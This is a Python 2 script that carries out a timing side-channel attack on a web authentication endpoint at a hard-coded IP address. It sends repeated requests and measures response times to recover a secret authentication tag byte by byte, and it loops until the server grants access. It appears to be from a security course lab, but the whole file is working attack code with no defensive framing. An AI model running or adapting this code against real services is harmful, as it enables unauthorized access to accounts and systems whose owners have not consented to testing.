import urllib2
import string
import time
from requests.exceptions import HTTPError
import timeit
import requests
import constant
import sys
from math import sqrt


def toHex(tag):
	temp = []
	for item in tag:
		temp.append(hex(item)[2:])
	str1 = ''.join(temp)
	return str1


def sampleTime(tag):
	timeArray = [0] * constant.NUMBER_OF_TESTS
	for x in range (constant.NUMBER_OF_TESTS):
		try:
			timeArray[x] = requests.get("http://130.243.27.198/auth/" + str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + toHex(tag)).elapsed.total_seconds()
		except:
			print "ERROR"
	return min(timeArray)
	
def verifyBits(tag,pos, meanTime, longest, prevTime):
	verified = 0
	connectionTimes = [0.0] * 17
	connectionTimes[pos/2] = longest
	print (prevTime + float(constant.TIMEOUT)/1000)
	if connectionTimes[pos/2] < (prevTime + (float(constant.TIMEOUT)/1000)):
		print constant.WARNING + "[!]WARNING: The connection times for this byte was shorter than or equal to the preceeding. This might indicate wrong byte." + constant.ENDC#remove this print after debugging
		#raw_input("Press Enter to continue")
	elif connectionTimes[pos/2] > (prevTime + float(constant.TIMEOUT)/1000):
		verified = 1
	return verified
	
def increaseTag(tag, pos):
	tag[pos + 1] += 1
	if tag[pos + 1] > 15:
		tag[pos] += 1
		tag[pos + 1] = 0
	return tag


def tryTag(tag, pos, meanTime):
	timeArray = [0] * constant.NUMBER_OF_TESTS
	longest = [0.0] * 3
	prevBit = [0] * 6
	retestBit = 0
	prevTime = meanTime
	verified = 0
	counter = 0
	while pos <= (constant.LENGTH_OF_TAG - 2):
		for x in range (constant.NUMBER_OF_TESTS):
			timeArray[x] = requests.get("http://130.243.27.198/auth/"+ str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + toHex(tag)).elapsed.total_seconds()
		connectionTime = min(timeArray)
		if connectionTime > longest[0]:
			longest[0] = connectionTime
			longest[1] = tag[pos]
			longest[2] = tag[pos + 1]
		tag = increaseTag(tag, pos)
		if tag[pos] > 15:
			tag[pos] = longest[1]
			tag[pos + 1] = longest[2]
			verified = verifyBits(tag,pos,meanTime,longest[0], prevTime)
			if verified == 1 or retestBit > 2:
				print "[#]Current tag: " + str(toHex(tag) + " Time: " + str(longest[0]) + " Previous time: " + str(prevTime) + " Delta: " + str((longest[0] - prevTime) * 1000) + " ms")
				pos += 2
				prevTime = longest[0]
				longest[0] = 0.0
				counter = 0
			elif verified == 0:
				prevBit[counter] = tag[pos]
				prevBit[counter + 1] = tag[pos + 1]
				if tag[pos] == prevBit[counter - 2] and tag[pos + 1] == prevBit[counter - 1]:
					retestBit += 1
				print constant.OKBLUE + "[#" + str(counter) + "]Re-running test on latest bit..." + constant.ENDC
				print constant.WARNING + "[#]Last 2 bits might be wrong: " + str(toHex(tag) + " Time: " + str(longest[0]) + " Previous time: " + str(prevTime) + " Delta: " + str((longest[0] - prevTime) * 1000) + " ms") + constant.ENDC
				tag[pos] = 0
				tag[pos + 1] = 0
				counter += 2
	return tag

authorized = False
counter = 0
while authorized == False:
	currentTag = [0] * constant.LENGTH_OF_TAG #Create a tag containing all 0
	meanTime = sampleTime(currentTag) #Calculate mean time for server parsing on currentTag
	currentTag = tryTag(currentTag, 0, meanTime) #Find the correct tag!
	print currentTag
	try:
		contents = urllib2.urlopen("http://130.243.27.198/auth/" + str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + toHex(currentTag)).read()
		print constant.OKGREEN + contents + constant.ENDC
		authorized = True
	except urllib2.HTTPError as error:
		if error.code == 401:
			print constant.FAIL +  '[ERROR]Wrong tag!' + constant.ENDC
			print constant.FAIL + error
			#Save this tag in a new array[counter]
			counter += 1
